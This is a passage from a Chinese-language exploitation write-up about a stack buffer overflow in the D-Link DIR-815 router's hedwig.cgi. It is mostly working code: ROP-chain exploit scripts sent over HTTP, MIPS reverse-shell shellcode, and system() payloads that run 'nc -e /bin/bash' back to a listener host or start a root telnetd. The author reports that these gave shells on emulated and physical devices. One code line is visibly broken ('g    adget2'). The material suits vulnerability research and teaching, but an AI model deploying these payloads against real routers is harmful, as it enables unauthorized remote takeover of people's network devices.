<pre class=" language-sh"><code class="language-sh">root@debian-mipsel:~/squashfs-root# echo 'uid=1234'| /htdocs/web/hedwig.cgi 
root@debian-mipsel:~/squashfs-root# </code></pre>
<p>接下来动态调试确定偏移但是在那之前需要关掉地址随机化，因为qemu的虚拟机内核开启了地址随机化，每次堆的地址都在变化，导致libc的基地址也不断在变，所以需要关闭地址随机化。</p>
<p><code>echo 0 &gt; /proc/sys/kernel/randomize_va_space</code></p>
<p>可以编写以下脚本进行动态调试</p>
<p>debug.sh，gdbsever 192.168.79.145是宿主机IP，6666是qemu监听端口。</p>
<pre class=" language-sh"><code class="language-sh">#!/bin/bash
export CONTENT_LENGTH="100"
export CONTENT_TYPE="application/x-www-form-urlencoded"
export HTTP_COOKIE="`cat content`"
export REQUEST_METHOD="POST"
export REQUEST_URI="/hedwig.cgi"
echo "uid=1234"|./gdbserver.mipsel 192.168.79.145:6666 /htdocs/web/hedwig.cgi</code></pre>
<p>宿主机gdb调试</p>
<pre class=" language-sh"><code class="language-sh">gdb-multiarch htdocs/cgibin
set architecture mips
target remote 192.168.79.143:6666 #对应qemu地址和端口
c</code></pre>
<p>得到溢出地址是0x68423668，利用脚本计算偏移为1009</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/gdbseveroffset.png" alt=""></p>
<pre class=" language-sh"><code class="language-sh">#./patternLocOffset.py -s 0x68423668 -l 2000 
[*] Create pattern string contains 2000 characters ok!
[*] No exact matches, looking for likely candidates...
[+] Possible match at offset 1009 (adjusted another-endian)
[+] take time: 0.0007 s</code></pre>
<p>接下来是确定libc的基地址，需要先把环境变量配置好，不然/htdocs/web/hedwig.cgi很快就执行完，进程立马就结束了，就得不到maps。</p>
<p>利用/htdocs/web/hedwig.cgi &amp; cat /proc/pid/maps ，<strong>a&amp;b 先执行a，在执行b，无论a成功与否都会执行b</strong>。因为关闭了地址随机化，libc.so.0的基地址就是0x77f34000。这里的libc.so.0是指向libuClibc-0.9.30.1.so。所以libuClibc-0.9.30.1.so基地址为0x77f34000。</p>
<pre class=" language-sh"><code class="language-sh">root@debian-mipsel:~/squashfs-root# export CONTENT_LENGTH="100"
root@debian-mipsel:~/squashfs-root# export CONTENT_TYPE="application/x-www-form-urlencoded"
root@debian-mipsel:~/squashfs-root# export HTTP_COOKIE="uid=1234"
root@debian-mipsel:~/squashfs-root# export REQUEST_METHOD="POST"
root@debian-mipsel:~/squashfs-root# export REQUEST_URI="/hedwig.cgi"

root@debian-mipsel:~/squashfs-root# /htdocs/web/hedwig.cgi & cat /proc/pid/maps
[10] 1052
cat: /proc/pid/maps: No such file or directory
root@debian-mipsel:~/squashfs-root# /htdocs/web/hedwig.cgi & cat /proc/pid/maps
[11] 1054
cat: /proc/pid/maps: No such file or directory
[10]+  Stopped                 /htdocs/web/hedwig.cgi
root@debian-mipsel:~/squashfs-root# /htdocs/web/hedwig.cgi & cat /proc/1056/maps 
[12] 1056
00400000-0041c000 r-xp 00000000 08:01 32694      /htdocs/cgibin
0042c000-0042d000 rw-p 0001c000 08:01 32694      /htdocs/cgibin
0042d000-0042f000 rwxp 00000000 00:00 0          [heap]
77f34000-77f92000 r-xp 00000000 08:01 547906     /lib/libc.so.0
77f92000-77fa1000 ---p 00000000 00:00 0 
77fa1000-77fa2000 r--p 0005d000 08:01 547906     /lib/libc.so.0
77fa2000-77fa3000 rw-p 0005e000 08:01 547906     /lib/libc.so.0
77fa3000-77fa8000 rw-p 00000000 00:00 0 
77fa8000-77fd1000 r-xp 00000000 08:01 546761     /lib/libgcc_s.so.1
77fd1000-77fe1000 ---p 00000000 00:00 0 
77fe1000-77fe2000 rw-p 00029000 08:01 546761     /lib/libgcc_s.so.1
77fe2000-77fe7000 r-xp 00000000 08:01 547907     /lib/ld-uClibc.so.0
77ff5000-77ff6000 rw-p 00000000 00:00 0 
77ff6000-77ff7000 r--p 00004000 08:01 547907     /lib/ld-uClibc.so.0
77ff7000-77ff8000 rw-p 00005000 08:01 547907     /lib/ld-uClibc.so.0
7ffd6000-7fff7000 rwxp 00000000 00:00 0          [stack]
7fff7000-7fff8000 r-xp 00000000 00:00 0          [vdso]

[11]+  Stopped                 /htdocs/web/hedwig.cgi
root@debian-mipsel:~/squashfs-root#</code></pre>
<h2 id="编写exp"><a href="#编写exp" class="headerlink" title="编写exp"></a>编写exp</h2><p>上面既然用了两种方法：system和sleep(1)，那么下面也使用这两种。</p>
<ol>
<li><p>system方法：将上面的exp的libc基地址和偏移改掉然后cmd换成<code>nc -e /bin/bash 192.168.79.145 9999</code></p>
<pre class=" language-sh"><code class="language-sh">#!/usr/bin/python2
from pwn import *
context.endian = "little"
context.arch = "mips"
base_addr = 0x77f34000
system_addr_1 = 0x53200-1
gadget1 = 0x45988
gadget2 = 0x159cc

cmd = 'nc -e /bin/bash 192.168.79.145 9999'
padding = 'A' * 973 #1009-4*9
padding += p32(base_addr + system_addr_1) # s0
padding += p32(base_addr + gadget2)       # s1
padding += 'A' * 4                        # s2
padding += 'A' * 4                        # s3
padding += 'A' * 4                        # s4
padding += 'A' * 4                           # s5
padding += 'A' * 4                        # s6
padding += 'A' * 4                        # s7
padding += 'A' * 4                        # fp
padding += p32(base_addr + gadget1)       # ra
padding += 'B' * 0x10
padding += cmd

f = open("context",'wb')
f.write(padding)
f.close()</code></pre>
<p>生成的context通过scp拷贝到mips虚拟机中并且<code>nano debug.sh</code>更改debug.sh</p>
<pre class=" language-sh"><code class="language-sh">#!/bin/bash
export CONTENT_LENGTH="100"
export CONTENT_TYPE="application/x-www-form-urlencoded"
export HTTP_COOKIE="uid=`cat context`"
export REQUEST_METHOD="POST"
export REQUEST_URI="/hedwig.cgi"
echo "uid=1234"|/htdocs/web/hedwig.cgi
#echo "uid=1234"|./gdbserver.mipsel 192.168.79.145:6666 /htdocs/web/hedwig.cgi</code></pre>
<p>在mips虚拟机运行之后在本机nc -vlp 9999，确实能够获取/bin/bash权限。成功了！说明rop链构造是没问题的。</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/ncvlp9999.png" alt=""></p>
</li>
<li><p>利用sleep(1)调用shellcode</p>
<p>这里的shllcode作用是给指定的IP地址和端口反弹shell，根据<a href="http://shell-storm.org/shellcode/files/shellcode-860.php" target="_blank" rel="noopener">文章</a>修改其中的socket反向连接IP，端口没有改变还是31337。</p>
<pre class=" language-sh"><code class="language-sh">#!/usr/bin/python2
from pwn import *
context.endian = "little"
context.arch = "mips"

shellcode = ""
shellcode += "\xff\xff\x04\x28\xa6\x0f\x02\x24\x0c\x09\x09\x01\x11\x11\x04\x28"
shellcode += "\xa6\x0f\x02\x24\x0c\x09\x09\x01\xfd\xff\x0c\x24\x27\x20\x80\x01"
shellcode += "\xa6\x0f\x02\x24\x0c\x09\x09\x01\xfd\xff\x0c\x24\x27\x20\x80\x01"
shellcode += "\x27\x28\x80\x01\xff\xff\x06\x28\x57\x10\x02\x24\x0c\x09\x09\x01"
shellcode += "\xff\xff\x44\x30\xc9\x0f\x02\x24\x0c\x09\x09\x01\xc9\x0f\x02\x24"
shellcode += "\x0c\x09\x09\x01\x79\x69\x05\x3c\x01\xff\xa5\x34\x01\x01\xa5\x20"
#shellcode += "\xf8\xff\xa5\xaf\x01\xb1\x05\x3c\xc0\xa8\xa5\x34\xfc\xff\xa5\xaf"#192.168.1.177:31337
shellcode += "\xf8\xff\xa5\xaf\x4f\x91\x05\x3c\xc0\xa8\xa5\x34\xfc\xff\xa5\xaf"#192.168.79.145
shellcode += "\xf8\xff\xa5\x23\xef\xff\x0c\x24\x27\x30\x80\x01\x4a\x10\x02\x24"
shellcode += "\x0c\x09\x09\x01\x62\x69\x08\x3c\x2f\x2f\x08\x35\xec\xff\xa8\xaf"
shellcode += "\x73\x68\x08\x3c\x6e\x2f\x08\x35\xf0\xff\xa8\xaf\xff\xff\x07\x28"
shellcode += "\xf4\xff\xa7\xaf\xfc\xff\xa7\xaf\xec\xff\xa4\x23\xec\xff\xa8\x23"
shellcode += "\xf8\xff\xa8\xaf\xf8\xff\xa5\x23\xec\xff\xbd\x27\xff\xff\x06\x28"
shellcode += "\xab\x0f\x02\x24\x0c\x09\x09\x01"

libc_base = 0x77f34000
sleep = 0x56BD0 #sleep jr ra 0x7678edf4
gadget1 = 0x57E50
gadget2 = 0x3B8A8
gadget3 = 0x14F28
gadget4 = 0x1DD08#0x15C84#0xBB44

payload = 'A' * 973 #1009-9*4
payload += 'A' * 4                           # s0
payload += p32(libc_base + gadget2)       # s1 = mipsrop.tail() && move $ra,$(sp+0x24) && jr s2
payload += p32(libc_base + sleep)         # s2 = jr $(sp+0x24)
payload += 'A' * 4                        # s3
payload += p32(libc_base + gadget4)       # s4 = mipsrop.find("move $t9,$s1") && jr shellcode
payload += 'A' * 4                           # s5
payload += 'A' * 4                        # s6
payload += 'A' * 4                        # s7
payload += 'A' * 4                        # fp
payload += p32(libc_base + gadget1)       # ra = mipsrop.find("li $a0,1") && jr s1

payload += 'B' * 0x24 # mipsrop.tail() 0x24B padding
payload += p32(libc_base + gadget3)       # $(sp+0x24) = mipsrop.stackfinder() && move s1,$(sp+0x18) && jr $s4

payload += 'c' * 0x18 # mipsrop.stackfinder() 0x18B padding
payload += shellcode

f = open("exploit2",'wb+')
f.write(payload)
f.close()</code></pre>
<p>生成的exploit2通过scp拷贝到mips虚拟机中并且<code>nano debug.sh</code>更改debug.sh运行得到shell。</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/ncvlp31337.png" alt=""></p>
</li>
</ol>
<p>利用HTTP报文获取shell,其实现在mips虚拟机相当于一个开启了部分web服务的DIR815路由器，我们可以通过发送http报文获取shell。</p>
<p>利用system函数</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">.</span>endian <span class="token operator">=</span> <span class="token string">"little"</span>
context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">"mips"</span>

<span class="token keyword">import</span> requests
<span class="token keyword">import</span> sys

<span class="token keyword">def</span> <span class="token function">get_payload</span><span class="token punctuation">(</span>offset<span class="token punctuation">,</span> libc_base<span class="token punctuation">,</span> cmd<span class="token punctuation">)</span><span class="token punctuation">:</span>
    gadget1 <span class="token operator">=</span> <span class="token number">0x45988</span>
    gadget2 <span class="token operator">=</span> <span class="token number">0x159cc</span>
    system_addr_1 <span class="token operator">=</span> <span class="token number">0x53200</span><span class="token operator">-</span><span class="token number">1</span>
    payload <span class="token operator">=</span> <span class="token string">'A'</span> <span class="token operator">*</span> offset
    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> system_addr_1<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># s0</span>
    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> gadget2<span class="token punctuation">)</span>       <span class="token comment" spellcheck="true"># s1</span>
    payload <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># s2</span>
    payload <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># s3</span>
    payload <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># s4</span>
    payload <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                           <span class="token comment" spellcheck="true"># s5</span>
    payload <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># s6</span>
    payload <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># s7</span>
    payload <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># fp</span>
    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> gadget1<span class="token punctuation">)</span>       <span class="token comment" spellcheck="true"># ra</span>
    payload <span class="token operator">+=</span> <span class="token string">'B'</span> <span class="token operator">*</span> <span class="token number">0x10</span>
    payload <span class="token operator">+=</span> cmd
    <span class="token keyword">return</span> payload

<span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">"__main__"</span><span class="token punctuation">:</span>
    cmd <span class="token operator">=</span> <span class="token string">"nc -e /bin/bash 192.168.79.145 9999"</span>
    cookie<span class="token operator">=</span><span class="token string">'uid='</span> <span class="token operator">+</span> get_payload<span class="token punctuation">(</span><span class="token number">973</span><span class="token punctuation">,</span> <span class="token number">0x77f34000</span><span class="token punctuation">,</span> cmd<span class="token punctuation">)</span>
    header <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token string">'Cookie'</span>        <span class="token punctuation">:</span> cookie<span class="token punctuation">,</span>
        <span class="token string">'Content-Type'</span>  <span class="token punctuation">:</span> <span class="token string">'application/x-www-form-urlencoded'</span><span class="token punctuation">,</span>
        <span class="token string">'Content-Length'</span><span class="token punctuation">:</span> <span class="token string">'100'</span>
        <span class="token punctuation">}</span>
    data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'uid'</span><span class="token punctuation">:</span><span class="token string">'1234'</span><span class="token punctuation">}</span>
    ip_port<span class="token operator">=</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
    url<span class="token operator">=</span><span class="token string">"http://"</span><span class="token operator">+</span>ip_port<span class="token operator">+</span><span class="token string">"/hedwig.cgi"</span>
    r<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>header<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>
    <span class="token keyword">print</span> r<span class="token punctuation">.</span>text</code></pre>
<p>测试结果：获取shell</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/httpshell.png" alt=""></p>
<p>利用sleep调用shellcode(反弹shell)</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">.</span>endian <span class="token operator">=</span> <span class="token string">"little"</span>
context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">"mips"</span>

<span class="token keyword">import</span> requests
<span class="token keyword">import</span> sys

<span class="token keyword">def</span> <span class="token function">get_payload</span><span class="token punctuation">(</span>offset<span class="token punctuation">,</span> libc_base<span class="token punctuation">)</span><span class="token punctuation">:</span>

    shellcode <span class="token operator">=</span> <span class="token string">""</span>
    shellcode <span class="token operator">+=</span> <span class="token string">"\xff\xff\x04\x28\xa6\x0f\x02\x24\x0c\x09\x09\x01\x11\x11\x04\x28"</span>
    shellcode <span class="token operator">+=</span> <span class="token string">"\xa6\x0f\x02\x24\x0c\x09\x09\x01\xfd\xff\x0c\x24\x27\x20\x80\x01"</span>
    shellcode <span class="token operator">+=</span> <span class="token string">"\xa6\x0f\x02\x24\x0c\x09\x09\x01\xfd\xff\x0c\x24\x27\x20\x80\x01"</span>
    shellcode <span class="token operator">+=</span> <span class="token string">"\x27\x28\x80\x01\xff\xff\x06\x28\x57\x10\x02\x24\x0c\x09\x09\x01"</span>
    shellcode <span class="token operator">+=</span> <span class="token string">"\xff\xff\x44\x30\xc9\x0f\x02\x24\x0c\x09\x09\x01\xc9\x0f\x02\x24"</span>
    shellcode <span class="token operator">+=</span> <span class="token string">"\x0c\x09\x09\x01\x79\x69\x05\x3c\x01\xff\xa5\x34\x01\x01\xa5\x20"</span>
    <span class="token comment" spellcheck="true">#shellcode += "\xf8\xff\xa5\xaf\x01\xb1\x05\x3c\xc0\xa8\xa5\x34\xfc\xff\xa5\xaf"#192.168.1.177:31337</span>
    shellcode <span class="token operator">+=</span> <span class="token string">"\xf8\xff\xa5\xaf\x4f\x91\x05\x3c\xc0\xa8\xa5\x34\xfc\xff\xa5\xaf"</span><span class="token comment" spellcheck="true">#192.168.79.145</span>
    shellcode <span class="token operator">+=</span> <span class="token string">"\xf8\xff\xa5\x23\xef\xff\x0c\x24\x27\x30\x80\x01\x4a\x10\x02\x24"</span>
    shellcode <span class="token operator">+=</span> <span class="token string">"\x0c\x09\x09\x01\x62\x69\x08\x3c\x2f\x2f\x08\x35\xec\xff\xa8\xaf"</span>
    shellcode <span class="token operator">+=</span> <span class="token string">"\x73\x68\x08\x3c\x6e\x2f\x08\x35\xf0\xff\xa8\xaf\xff\xff\x07\x28"</span>
    shellcode <span class="token operator">+=</span> <span class="token string">"\xf4\xff\xa7\xaf\xfc\xff\xa7\xaf\xec\xff\xa4\x23\xec\xff\xa8\x23"</span>
    shellcode <span class="token operator">+=</span> <span class="token string">"\xf8\xff\xa8\xaf\xf8\xff\xa5\x23\xec\xff\xbd\x27\xff\xff\x06\x28"</span>
    shellcode <span class="token operator">+=</span> <span class="token string">"\xab\x0f\x02\x24\x0c\x09\x09\x01"</span>

    sleep <span class="token operator">=</span> <span class="token number">0x56BD0</span> <span class="token comment" spellcheck="true">#sleep jr ra 0x7678edf4</span>
    gadget1 <span class="token operator">=</span> <span class="token number">0x57E50</span>
    gadget2 <span class="token operator">=</span> <span class="token number">0x3B8A8</span>
    gadget3 <span class="token operator">=</span> <span class="token number">0x14F28</span>
    gadget4 <span class="token operator">=</span> <span class="token number">0x1DD08</span><span class="token comment" spellcheck="true">#0x15C84#0xBB44</span>

    payload <span class="token operator">=</span> <span class="token string">'A'</span> <span class="token operator">*</span> offset <span class="token comment" spellcheck="true">#1009-9*4</span>
    payload <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                           <span class="token comment" spellcheck="true"># s0</span>
    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> gadget2<span class="token punctuation">)</span>       <span class="token comment" spellcheck="true"># s1 = mipsrop.tail() &amp;&amp; move $ra,$(sp+0x24) &amp;&amp; jr s2</span>
    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> sleep<span class="token punctuation">)</span>         <span class="token comment" spellcheck="true"># s2 = jr $(sp+0x24)</span>
    payload <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># s3</span>
    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> gadget4<span class="token punctuation">)</span>       <span class="token comment" spellcheck="true"># s4 = mipsrop.find("move $t9,$s1") &amp;&amp; jr shellcode</span>
    payload <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                           <span class="token comment" spellcheck="true"># s5</span>
    payload <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># s6</span>
    payload <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># s7</span>
    payload <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># fp</span>
    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> gadget1<span class="token punctuation">)</span>       <span class="token comment" spellcheck="true"># ra = mipsrop.find("li $a0,1") &amp;&amp; jr s1</span>

    payload <span class="token operator">+=</span> <span class="token string">'B'</span> <span class="token operator">*</span> <span class="token number">0x24</span> <span class="token comment" spellcheck="true"># mipsrop.tail() 0x24B padding</span>
    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> gadget3<span class="token punctuation">)</span>       <span class="token comment" spellcheck="true"># $(sp+0x24) = mipsrop.stackfinder() &amp;&amp; move s1,$(sp+0x18) &amp;&amp; jr $s4</span>

    payload <span class="token operator">+=</span> <span class="token string">'c'</span> <span class="token operator">*</span> <span class="token number">0x18</span> <span class="token comment" spellcheck="true"># mipsrop.stackfinder() 0x18B padding</span>
    payload <span class="token operator">+=</span> shellcode

    <span class="token keyword">return</span> payload

<span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">"__main__"</span><span class="token punctuation">:</span>

    cookie<span class="token operator">=</span><span class="token string">'uid='</span> <span class="token operator">+</span> get_payload<span class="token punctuation">(</span><span class="token number">973</span><span class="token punctuation">,</span> <span class="token number">0x77f34000</span><span class="token punctuation">)</span>
    header <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token string">'Cookie'</span>        <span class="token punctuation">:</span> cookie<span class="token punctuation">,</span>
        <span class="token string">'Content-Type'</span>  <span class="token punctuation">:</span> <span class="token string">'application/x-www-form-urlencoded'</span><span class="token punctuation">,</span>
        <span class="token string">'Content-Length'</span><span class="token punctuation">:</span> <span class="token string">'100'</span>
        <span class="token punctuation">}</span>
    data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'uid'</span><span class="token punctuation">:</span><span class="token string">'1234'</span><span class="token punctuation">}</span>
    ip_port<span class="token operator">=</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
    url<span class="token operator">=</span><span class="token string">"http://"</span><span class="token operator">+</span>ip_port<span class="token operator">+</span><span class="token string">"/hedwig.cgi"</span>
    r<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>header<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>
    <span class="token keyword">print</span> r<span class="token punctuation">.</span>text</code></pre>
<p>测试结果：获取shell</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/http_getshell_sleep.png" alt=""></p>
<h1 id="Firmadyne仿真及实体机测试"><a href="#Firmadyne仿真及实体机测试" class="headerlink" title="Firmadyne仿真及实体机测试"></a>Firmadyne仿真及实体机测试</h1><p>Firmadyne的安装过程这里就不再继续介绍，这里是用它来测试，能够启动起来。并且访问firmadyne给其分配的默认web接口192.168.0.1。</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/firmadyne.png" alt=""></p>
<p>nmap扫描查看开放的端口，目前3各端口分别对应dns53,http80,upnp49152。</p>
<pre class=" language-sh"><code class="language-sh">Starting Nmap 7.01 ( https://nmap.org ) at 2020-05-24 16:21 CST
Nmap scan report for 192.168.0.1
Host is up (0.00041s latency).
Not shown: 997 closed ports
PORT      STATE SERVICE VERSION
53/tcp    open  domain  dnsmasq 2.45
80/tcp    open  http    D-Link DIR-815 WAP http config 1.01
49152/tcp open  upnp    D-Link DIR-815 WAP UPnP 1.01 (UPnP 1.0)
MAC Address: 52:54:00:12:34:58 (QEMU virtual NIC)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6.32
OS details: Linux 2.6.32
Network Distance: 1 hop
Service Info: OS: Linux; Device: WAP; CPE: cpe:/h:dlink:dir-815:1.01, cpe:/o:linux:linux_kernel, cpe:/h:d-link:dir-815</code></pre>
<p>构造exp进行测试</p>
<p>其实这里需要跟之前qemu系统模式一样，上传gdbsever进行调试确定偏移和libc基地址。这里直接利用师傅帖子中的代码进行测试。这里的基地址是根据firmadyne中用linux内核版本为2.6.32，别的帖子中测试的基地址为0x2aaf8000，并且metasploit里面的<a href="https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/http/dlink_hedwig_cgi_bof.rb" target="_blank" rel="noopener">payload</a>写到：路由器环境中基地址为0x2aaf8000，qemu环境为0x40854000。两个可以都试试！</p>
<pre class=" language-sh"><code class="language-sh">[ 'Multiple Targets: D-Link DIR-645 v1.03, DIR-300 v2.14, DIR-600',
            {
              'Offset'      => 973,
              'LibcBase'    => 0x2aaf8000,    # Router
              #'LibcBase'   => 0x40854000,    # QEMU environment
              'System'      => 0x000531FF,    # address of system
              'CalcSystem'  => 0x000158C8,    # calculate the correct address of system
              'CallSystem'  => 0x000159CC,    # call our system
            }
          ]</code></pre>
<p>下面编写exp进行测试，利用system函数进行测试。</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">.</span>endian <span class="token operator">=</span> <span class="token string">"little"</span>
context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">"mips"</span>

<span class="token keyword">import</span> requests
<span class="token keyword">import</span> sys

<span class="token keyword">def</span> <span class="token function">get_payload</span><span class="token punctuation">(</span>offset<span class="token punctuation">,</span> libc_base<span class="token punctuation">,</span> cmd<span class="token punctuation">)</span><span class="token punctuation">:</span>
    gadget1 <span class="token operator">=</span> <span class="token number">0x45988</span>
    gadget2 <span class="token operator">=</span> <span class="token number">0x159cc</span>
    system_addr_1 <span class="token operator">=</span> <span class="token number">0x53200</span><span class="token operator">-</span><span class="token number">1</span>
    payload <span class="token operator">=</span> <span class="token string">'A'</span> <span class="token operator">*</span> offset
    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> system_addr_1<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># s0</span>
    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> g    adget2<span class="token punctuation">)</span>   <span class="token comment" spellcheck="true"># s1</span>
    payload <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># s2</span>
    payload <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># s3</span>
    payload <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># s4</span>
    payload <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                           <span class="token comment" spellcheck="true"># s5</span>
    payload <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># s6</span>
    payload <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># s7</span>
    payload <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># fp</span>
    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> gadget1<span class="token punctuation">)</span>       <span class="token comment" spellcheck="true"># ra</span>
    payload <span class="token operator">+=</span> <span class="token string">'B'</span> <span class="token operator">*</span> <span class="token number">0x10</span>
    payload <span class="token operator">+=</span> cmd
    <span class="token keyword">return</span> payload

<span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">"__main__"</span><span class="token punctuation">:</span>
    <span class="token comment" spellcheck="true">#cmd = "nc -e /bin/bash 192.168.79.145 9999"</span>
    cmd <span class="token operator">=</span> <span class="token string">'telnetd -p 222 -l /bin/sh'</span>
    cookie<span class="token operator">=</span><span class="token string">'uid='</span> <span class="token operator">+</span> get_payload<span class="token punctuation">(</span><span class="token number">973</span><span class="token punctuation">,</span> <span class="token number">0x2aaf8000</span><span class="token punctuation">,</span> cmd<span class="token punctuation">)</span>
    header <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token string">'Cookie'</span>        <span class="token punctuation">:</span> cookie<span class="token punctuation">,</span>
        <span class="token string">'Content-Type'</span>  <span class="token punctuation">:</span> <span class="token string">'application/x-www-form-urlencoded'</span><span class="token punctuation">,</span>
        <span class="token string">'Content-Length'</span><span class="token punctuation">:</span> <span class="token string">'100'</span>
        <span class="token punctuation">}</span>
    data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'uid'</span><span class="token punctuation">:</span><span class="token string">'1234'</span><span class="token punctuation">}</span>
    ip_port<span class="token operator">=</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
    url<span class="token operator">=</span><span class="token string">"http://"</span><span class="token operator">+</span>ip_port<span class="token operator">+</span><span class="token string">"/hedwig.cgi"</span>
    r<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>header<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>
    <span class="token keyword">print</span> r<span class="token punctuation">.</span>text</code></pre>
<p>测试结果显示能够执行<code>telnetd -p 222 -l /bin/sh</code>。telnet 上去对应的窗口直接反弹shell。</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/telnetdp222.png" alt=""></p>
<p>在实体机上刷上1.01的版本，用system方法的exp同样能得到获取shell。</p>
